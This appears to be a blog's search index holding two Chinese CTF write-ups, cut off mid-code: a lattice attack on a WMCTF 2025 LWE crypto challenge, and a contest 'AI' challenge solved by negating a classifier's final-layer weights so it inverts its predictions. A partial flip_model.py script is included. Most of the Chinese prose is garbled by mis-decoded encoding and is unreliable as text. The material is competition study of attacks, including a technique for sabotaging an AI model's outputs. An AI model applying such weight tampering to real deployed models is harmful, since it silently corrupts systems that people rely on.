<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>WMCTF 2025 å¤ç°</title>
    <link href="/2025/09/22/WMCTF%202025%20%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/09/22/WMCTF%202025%20%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>åœ¨å›¢é˜Ÿçš„å…±åŒåŠªåŠ›ä¸‹ï¼Œæˆ‘ä»¬ DAWN æˆ˜é˜Ÿä¹Ÿæ˜¯æˆåŠŸæŒ¤è¿›äº†å‰å Ïƒ ï¾Ÿâˆ€ ï¾Ÿ) ï¾Ÿâˆ€ï¾Ÿ)Ïƒï¼Œè®°å½•ä¸€ä¸‹æœ‰è¶£çš„é¢˜ç›®ï¼Œæ›´æ–°ing</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="LW3"><a href="#LW3" class="headerlink" title="LW3"></a>LW3</h2><p>æ¯”èµ›æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œçœ‹äº†é¸¡å—å’Œ MNGA çš„ wp æ‰å¼€å§‹å¤ç°ã€‚<br><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice, sample<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>m, n = <span class="hljs-number">90</span>, <span class="hljs-number">64</span><br>p = <span class="hljs-number">1048583</span><br><br>E = sample(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, p), <span class="hljs-number">3</span>)<br>s = random_vector(Zmod(p), n)<br>A = random_matrix(Zmod(p), m, n)<br>e = vector(Zmod(p), [choice(E) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m)])<br>b = A*s + e<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ :&quot;</span>, E + A.<span class="hljs-built_in">list</span>() + b.<span class="hljs-built_in">list</span>())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸš© :&quot;</span>, AES.new(key=md5((<span class="hljs-built_in">str</span>(s)).encode()).digest(), nonce=<span class="hljs-string">b&quot;Tiffany&quot;</span>, mode=AES.MODE_CTR).encrypt(flag))<br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>$$<br>b_{m\times1} &#x3D; A_{m\times n}s_{n\times 1}+e_{m\times 1} \mod p<br>$$<br>è¿™ç§å½¢å¼åº”è¯¥å¾ˆå®¹æ˜“å°±è”æƒ³åˆ° LWE å®¹é”™å­¦ä¹ é—®é¢˜ï¼Œä½†æ˜¯é€šå¸¸æƒ…å†µä¸‹ï¼Œ e éƒ½æ˜¯éšæœºå–å€¼ï¼Œè€Œè¿™é“é¢˜è™½ç„¶è¯´ä¹Ÿæ˜¯éšæœºå–å€¼ï¼Œä½†æ˜¯å®ƒçš„å–å€¼åªèƒ½ä»é•¿åº¦ä¸º 3 çš„ç©ºé—´ E ä¸­é€‰å–ã€‚<br>ç”±äºæˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è¦æ‰¾åˆ°éšæœºå˜é‡ s çš„å€¼ï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªæœç´¢å‹ LWEï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨ Primal Attackï¼Œä¹Ÿå°±æ˜¯ç›´æ¥è§„çº¦æ•´ä¸ªçº¿æ€§ç³»ç»Ÿï¼Œæœ‰</p><p>$$<br>(s_1,s_2â€¦s_n,1,k_1,k_2â€¦k_m)<br>\begin{pmatrix}<br>1 &amp;   &amp;   &amp;   &amp; -a_{11} &amp; -a_{21} &amp; \cdots &amp; -a_{(m-1)1} &amp; -a_{m1} \newline<br>  &amp;  \ddots &amp;   &amp;   &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots \newline<br>  &amp;   &amp;   &amp; 1 &amp; -a_{1n} &amp; -a_{2n} &amp; \cdots &amp; -a_{(m-1)n} &amp; -a_{mn} \newline<br>  &amp;   &amp;   &amp;   &amp; b_1   &amp; b_2   &amp; \cdots &amp; b_{m-1}   &amp; b_m  \newline<br>  &amp;   &amp;   &amp;   &amp; p      &amp; 0      &amp; \cdots &amp; 0          &amp; 0  \newline<br>  &amp;   &amp;   &amp;   &amp; 0      &amp; p      &amp; \cdots &amp; 0          &amp; 0  \newline<br>  &amp;   &amp;   &amp;   &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots     &amp; \vdots \newline<br>  &amp;   &amp;   &amp;   &amp; 0      &amp; 0      &amp; \cdots &amp; p          &amp; 0 \newline<br>  &amp;   &amp;   &amp;   &amp; 0      &amp; 0      &amp; \cdots &amp; 0          &amp; p<br>\end{pmatrix}<br>&#x3D;(s_1,s_2â€¦s_n,e_1,e_2â€¦e_m)<br>$$</p><p>ç®€è¦åœ°å†™å°±æœ‰ï¼š</p><p>$$<br>(s_{1\times n},1,k_{1\times m})<br>\begin{pmatrix}<br>I_{n\times n} &amp; -A^T \newline<br>0  &amp;  b_{1\times m} \newline<br>0  &amp;  pI<br>\end{pmatrix}<br>&#x3D;(s_{1\times n},e_{1\times m})<br>$$</p><p>ä½†æ˜¯è¿™ä¸ªæ ¼å¹¶ä¸æ˜¯å¾ˆå¥½ï¼Œéœ€è¦è¿›è¡Œä¼˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ¶ˆå»ç›®æ ‡å‘é‡ä¸­çš„ s å‘é‡æ¥è¿›è¡Œé™ç»´å¤„ç†</p><p>$$<br>(s_{1\times n},1,k_{1\times m})<br>\begin{pmatrix}<br>-A^T \newline<br>b_{1\times m} \newline<br>pI<br>\end{pmatrix}<br>&#x3D; (e_{1\times m})<br>$$</p><p>åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­ï¼Œæˆ‘æŒ‰ç…§é¸¡å—å¸ˆå‚…çš„ easy_mod X é¢˜ç›®çš„æ­¥éª¤å°è¯•å¤ç°ï¼Œå°† e çš„å–å€¼ç©ºé—´ E ä»¿å°„åˆ°ä¸€ä¸ªæ•°å€¼è¾ƒå°çš„ç©ºé—´ Eâ€™ ä¸­ï¼Œå…·ä½“çš„ä»¿å°„æ–¹æ³•å¦‚ä¸‹ï¼š</p><p>$$<br>Eâ€™ &#x3D; kE + t(1,1,1) \mod p<br>$$</p><p>å…·ä½“å¯ä»¥é€ æ ¼æ¥æ±‚<br>1</p><h1 id="k-t-r-1-r-2-r-3-begin-pmatrix-E-1-E-2-E-3-newline1-1-1-newlinep-0-0-newline0-p-0-newline0-0-p-newline-end-pmatrix"><a href="#k-t-r-1-r-2-r-3-begin-pmatrix-E-1-E-2-E-3-newline1-1-1-newlinep-0-0-newline0-p-0-newline0-0-p-newline-end-pmatrix" class="headerlink" title="$$(k,t,r_1,r_2,r_3)\begin{pmatrix}E_1 &amp; E_2 &amp; E_3 \newline1   &amp; 1   &amp; 1   \newlinep   &amp; 0   &amp; 0   \newline0   &amp; p   &amp; 0   \newline0   &amp; 0   &amp; p   \newline\end{pmatrix}"></a>$$<br>(k,t,r_1,r_2,r_3)<br>\begin{pmatrix}<br>E_1 &amp; E_2 &amp; E_3 \newline<br>1   &amp; 1   &amp; 1   \newline<br>p   &amp; 0   &amp; 0   \newline<br>0   &amp; p   &amp; 0   \newline<br>0   &amp; 0   &amp; p   \newline<br>\end{pmatrix}</h1><p>(E_1â€™,E_2â€™,E_3â€™)<br>$$</p><p>ç„¶é¹…é€šè¿‡è¿™ç§æ–¹æ³•ç®—å‡ºçš„ Eâ€™ å¹¶ä¸æ˜¯å¾ˆå°ï¼Œå®æµ‹å‡ºæ¥çš„ Eâ€™ ä¸º<code>[-298,582,-285]</code>ï¼Œè¿™å°±å¯¼è‡´ä»¿å°„ä¹‹åçš„ errorâ€™ å…¶å®è¿˜æ˜¯å¾ˆå¤§ï¼Œæˆ‘ä»¬è¿˜æ˜¯ä¸èƒ½ç›´æ¥æ±‚è§£è¿™ä¸ª LWE é—®é¢˜ã€‚<br>åœ¨æ¯”èµ›æ—¶çš„æ€è·¯å°±åˆ°è¿™å„¿äº†ï¼Œå½“æ—¶ä¹Ÿè·Ÿé˜Ÿå‹è®¨è®ºè¿‡ k,t æ˜¯ä¸æ˜¯æ‰¾çš„ä¸å¥½ï¼Œå¯¼è‡´ Eâ€™ å¹¶ä¸èƒ½å¾ˆå°ï¼Œä½†æ˜¯ä¹Ÿæ²¡æ‰¾åˆ°æ›´å¥½åœ°ä»¿å°„æ–¹æ³•ã€‚æ¯”èµ›æ—¶ä¹Ÿæƒ³è¿‡æ˜¯å¦è·Ÿä»¿å°„å­ç©ºé—´ç›¸å…³ï¼Œæ¯•ç«Ÿä¹‹å‰åœ¨å¤ç° LilCTF 2025 æ—¶é¸¡å—å¸ˆå‚…å°±å‡ºè¿‡ Space Travel è¿™ç±»è·Ÿä»¿å°„å­ç©ºé—´ç›¸å…³çš„é¢˜ç›®ï¼Œä½†æ˜¯æ€è·¯å¥½åƒå¹¶ä¸æ˜¯å¾ˆæ˜äº†ï¼Œä¹ŸåŠ ä¸Šå¯¹ä»¿å°„å­ç©ºé—´çš„ç†è§£è¿˜ä¸æ˜¯å¾ˆæ·±ï¼Œå› æ­¤å¹¶æ²¡æœ‰æ·±ç©¶ï¼Œå°±è¿™æ ·æ— ä¸ºåˆ°äº†æ¯”èµ›ç»“æŸã€‚ã€‚<br>èµ›åçœ‹äº†é¸¡å—å¸ˆå‚…çš„ wp ä¹‹åæ‰æ˜ç™½è¿‡æ¥ï¼Œåˆ©ç”¨ LeetSpe4k è¿™é“é¢˜çš„æ€è·¯ä¸è®ºæ˜¯å¤šå¤§çš„ E éƒ½èƒ½æ˜ å°„åˆ°å¤šä¸ª 01 ç»„æˆçš„å‘é‡ä¸­ï¼Œåœ¨æœ¬é¢˜ä¸­å°±æœ‰ï¼š<br>$$<br>e_i &#x3D; (x_i,y_i,z_i)E_{3\times 1}<br>$$<br>å…¶ä¸­ï¼Œ$x_i,y_i,z_i\in {0,1}$<br>è¿™æ ·ä¹Ÿå°±å¯ä»¥å°† $e_i$ æ˜ å°„ä¸ºä¸‰ä¸ª 01 å‘é‡ä¸Šï¼Œè¿™ä¸‰ä¸ªå‘é‡åˆ†åˆ«ä¸º $(1,0,0),(0,1,0),(0,0,1)$ï¼Œæ˜æ˜¾å­˜åœ¨ä»¿å°„å­ç©ºé—´ã€‚<br>å³<br>$$<br>e_i &#x3D; E_1+(x_i,y_i)<br>\begin{pmatrix}<br>E_2-E_1 \newline<br>E_3-E_1<br>\end{pmatrix}<br>$$<br>å…¶ä¸­ï¼Œ$x_i,y_i\in {0,1}$,åˆ†åˆ«ä¸º $(0,0),(1,0),(0,1)$<br>$$<br>b_{m\times1} &#x3D; A_{m\times n}s_{n\times 1}+e_{m\times 1} \mod p<br>$$<br>åç»­å°±æ˜¯é€ æ ¼äº†ï¼Œå…·ä½“ä»£ç æš‚æ—¶æ²¡å†™ï¼Œæœ‰éœ€è¦å¯ä»¥ç›´æ¥æŸ¥çœ‹é¸¡å—å¸ˆå‚…çš„ä»£ç ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬äº”å±Šâ€œé•¿åŸæ¯â€ç½‘ç»œå®‰å…¨å¤§èµ› æš¨äº¬æ´¥å†€è’™ç½‘ç»œå®‰å…¨æŠ€èƒ½ç«èµ›ï¼ˆåˆèµ›ï¼‰</title>
    <link href="/2025/09/20/%E7%AC%AC%E4%BA%94%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%20%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/"/>
    <url>/2025/09/20/%E7%AC%AC%E4%BA%94%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%20%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><ol><li>ä»ä½ è®­ç»ƒå¥½çš„ <code>*.pth</code>ï¼ˆä¿å­˜çš„æ˜¯ <code>state_dict</code>ï¼‰ä¸­<strong>è‡ªåŠ¨å®šä½æœ€åä¸€å±‚çš„çº¿æ€§æƒé‡ä¸åç½®</strong>ï¼ˆå¸¸è§å½¢å¼ï¼š<code>...weight</code> çš„ shape ä¸º <code>[1, hidden]</code>ï¼Œ<code>...bias</code> çš„ shape ä¸º <code>[1]</code>ï¼‰ï¼Œå¹¶æŠŠå®ƒä»¬å–è´Ÿï¼ˆç›¸å½“äºæŠŠæ¨¡å‹è¾“å‡ºç¿»è½¬ä¸º <code>1 - original</code>ï¼‰ã€‚</li><li>å¯é€‰åœ°åœ¨æœ¬åœ°åšä¸€æ¬¡å¿«é€Ÿè‡ªæ£€ï¼šæŠŠåŸæ¨¡å‹å’Œç¿»è½¬åæ¨¡å‹éƒ½è½½å…¥åˆ° <code>TextClassifier(Parameters)</code> ä¸­ï¼Œç”¨ä¸€ä¸ªéšæœº&#x2F;ç©ºè¾“å…¥æ¯”è¾ƒä¸¤è€…è¾“å‡ºï¼ˆæœŸæœ›è¿‘ä¼¼ <code>y + y_flipped â‰ˆ 1</code>ï¼‰</li></ol><blockquote><p>è¯´æ˜ï¼šæ­¤è„šæœ¬éµå¾ªå°½é‡é€šç”¨çš„æŸ¥æ‰¾è§„åˆ™ï¼ˆé€šè¿‡å‚æ•°å½¢çŠ¶å’Œå¸¸è§åå­—è¯†åˆ«æœ€åä¸€å±‚ï¼‰ã€‚è‹¥ä½ çš„æ¨¡å‹æœ€åå±‚å‘½åéå¸¸ç‰¹æ®Šï¼Œè„šæœ¬ä¼šç»™å‡ºè¯Šæ–­ä¿¡æ¯å¹¶æç¤ºæ‰‹å·¥æŒ‡å®šæƒé‡åã€‚</p></blockquote><ul><li><strong>è‹¥åŸæ¨¡å‹åœ¨ secret <code>val_set.csv</code> ä¸Šçš„é¢„æµ‹å‡ ä¹å…¨éƒ¨æ­£ç¡®ï¼ˆåŸæ¨¡å‹ <code>pred == original_label</code>ï¼‰</strong>ï¼Œé‚£ä¹ˆç¿»è½¬å <code>pred&#39; = 1 - pred</code> å°†å‡ ä¹å…¨éƒ¨ç­‰äº <code>1 - original_label</code>ï¼Œä»è€Œæ»¡è¶³é¢˜ç›®åˆ¤å®šæ¡ä»¶ï¼ŒæœåŠ¡å™¨ä¼šè¿”å› flagã€‚</li><li>å¦‚æœåŸæ¨¡å‹åœ¨éªŒè¯é›†ä¸Šä¸å¤Ÿå‡†ç¡®ï¼ˆé¢„æµ‹ä¸çœŸå®æ ‡ç­¾å¹¶éåŸºæœ¬ä¸€è‡´ï¼‰ï¼Œç¿»è½¬ä¹Ÿæ— æ³•ä¿è¯â€œå…¨éƒ¨è¢«è¯¯å¯¼â€ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆé€šå¸¸å…ˆç”¨æŠ•æ¯’æˆ–è®­ç»ƒå¾—åˆ°ä¸€ä¸ªåœ¨éªŒè¯é›†ä¸Šè¡¨ç°å¾ˆé«˜çš„æ¨¡å‹ï¼Œå†ç¿»è½¬å…¶è¾“å‡ºä»¥ç¨³å¦¥é€šè¿‡ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># flip_model.py</span><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_candidate_last_linear</span>(<span class="hljs-params">state_dict</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å°è¯•ä» state_dict ä¸­å¯»æ‰¾æœ€åä¸€å±‚ linear çš„ weight keyã€‚</span><br><span class="hljs-string">    ç­–ç•¥ï¼š</span><br><span class="hljs-string">      1) é¦–å…ˆæ‰¾æ‰€æœ‰ tensor ndim==2 ä¸” shape[0]==1 çš„ weightï¼ˆå…¸å‹ binary linear è¾“å‡º [1, hidden]ï¼‰</span><br><span class="hljs-string">      2) è‹¥æ²¡æœ‰ï¼Œå°è¯•æŒ‰åå­—å¯å‘å¼åŒ¹é…åŒ…å«å¸¸è§åç¼€çš„ weightï¼ˆfc, classifier, out, linear, denseï¼‰</span><br><span class="hljs-string">    è¿”å› (weight_key, bias_key) æˆ– (None, None)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    cand_weights = [k <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> state_dict.items() <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isinstance</span>(v, torch.Tensor) <span class="hljs-keyword">and</span> v.ndim == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> v.shape[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>)]<br>    <span class="hljs-keyword">if</span> cand_weights:<br>        <span class="hljs-comment"># é€‰ç¬¬ä¸€ä¸ªï¼ˆé€šå¸¸åªæœ‰ä¸€ä¸ªï¼‰</span><br>        wkey = cand_weights[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># å°è¯•å¯¹åº” bias</span><br>        bkey = wkey.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.bias&#x27;</span> <span class="hljs-keyword">if</span> (wkey.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.bias&#x27;</span>) <span class="hljs-keyword">in</span> state_dict <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">if</span> bkey <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-comment"># å°è¯•æ‰¾åˆ°ä»»ä½• shape == (1,) çš„ bias</span><br>            bias_cands = [k <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> state_dict.items() <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(v, torch.Tensor) <span class="hljs-keyword">and</span> v.ndim == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> v.shape[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>]<br>            bkey = bias_cands[<span class="hljs-number">0</span>] <span class="hljs-keyword">if</span> bias_cands <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> wkey, bkey<br><br>    <span class="hljs-comment"># å¯å‘å¼åç§°åŒ¹é…</span><br>    name_hints = [<span class="hljs-string">&#x27;fc.weight&#x27;</span>, <span class="hljs-string">&#x27;classifier.weight&#x27;</span>, <span class="hljs-string">&#x27;out.weight&#x27;</span>, <span class="hljs-string">&#x27;linear.weight&#x27;</span>, <span class="hljs-string">&#x27;dense.weight&#x27;</span>]<br>    <span class="hljs-keyword">for</span> hint <span class="hljs-keyword">in</span> name_hints:<br>        matches = [k <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> state_dict.keys() <span class="hljs-keyword">if</span> hint <span class="hljs-keyword">in</span> k <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(state_dict[k], torch.Tensor)]<br>        <span class="hljs-keyword">if</span> matches:<br>            wkey = matches[-<span class="hljs-number">1</span>]  <span class="hljs-comment"># å–æœ€åä¸€é¡¹æ›´å¯èƒ½æ˜¯é¡¶å±‚</span><br>            bkey = wkey.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.bias&#x27;</span> <span class="hljs-keyword">if</span> (wkey.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.bias&#x27;</span>) <span class="hljs-keyword">in</span> state_dict <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">if</span> bkey <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                bias_cands = [k <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> state_dict.items() <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(v, torch.Tensor) <span class="hljs-keyword">and</span> v.ndim == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> v.shape[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>]<br>                bkey = bias_cands[<span class="hljs-number">0</span>] <span class="hljs-keyword">if</span> bias_cands <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">return</span> wkey, bkey<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flip_last_layer</span>(<span class="hljs-params">input_path, output_path, force=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(input_path):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[ERROR] è¾“å…¥æ¨¡å‹æ–‡ä»¶ä¸å­˜åœ¨: <span class="hljs-subst">&#123;input_path&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    sd = torch.load(input_path, map_location=<span class="hljs-string">&#x27;cpu&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(sd, <span class="hljs-built_in">dict</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[WARN] åŠ è½½åˆ°çš„å¯¹è±¡ä¸æ˜¯ state_dictï¼ˆdictï¼‰ã€‚å¦‚æœè¿™æ˜¯æ•´ä¸ª model å¯¹è±¡ï¼Œå°è¯•ä¿å­˜ state_dict è€Œä¸æ˜¯æ•´ä¸ªæ¨¡å‹ã€‚&quot;</span>)<br>        <span class="hljs-comment"># å¦‚æœç”¨æˆ·ç¡®å®ä¿å­˜äº†æ•´ä¸ªæ¨¡å‹å¯¹è±¡ï¼Œå°è¯•å–å…¶ state_dict</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(sd, <span class="hljs-string">&#x27;state_dict&#x27;</span>):<br>            sd = sd.state_dict()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ERROR] æ—¢ä¸æ˜¯ state_dict ä¹Ÿä¸æ˜¯ model å¯¹è±¡ï¼Œæ— æ³•å¤„ç†ã€‚&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    wkey, bkey = find_candidate_last_linear(sd)<br>    <span class="hljs-keyword">if</span> wkey <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[WARN] æœªèƒ½è‡ªåŠ¨å®šä½æœ€åä¸€å±‚çº¿æ€§æƒé‡ï¼ˆæ²¡æœ‰æ‰¾åˆ°å½¢çŠ¶ä¸º [1, hidden] çš„ weightï¼Œä¹ŸæœªåŒ¹é…å¸¸è§åç§°ï¼‰ã€‚&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å¯é€‰æ“ä½œï¼š&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  1) æ‰‹åŠ¨æŒ‡å®šè¦ç¿»è½¬çš„æƒé‡ keyï¼ˆä½¿ç”¨ --weight-key ä¸ --bias-keyï¼‰ã€‚&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  2) æŸ¥çœ‹ state_dict.keys() å¹¶é€‰æ‹©åˆé€‚çš„ keyã€‚&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nstate_dict keys preview:&quot;</span>)<br>        <span class="hljs-keyword">for</span> i, k <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span 